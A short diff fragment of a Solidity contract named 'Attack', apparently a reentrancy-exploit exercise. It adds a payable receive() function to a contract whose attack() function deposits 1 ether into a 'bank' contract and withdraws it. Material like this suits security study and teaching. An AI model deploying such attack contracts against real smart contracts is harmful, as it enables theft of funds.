@@ -16,6 +16,8 @@ contract Attack {
         }
     }
 
+    receive() external payable {}
+
     function attack() public payable {
         bank.deposit{value: 1 ether}();
         bank.withdraw();
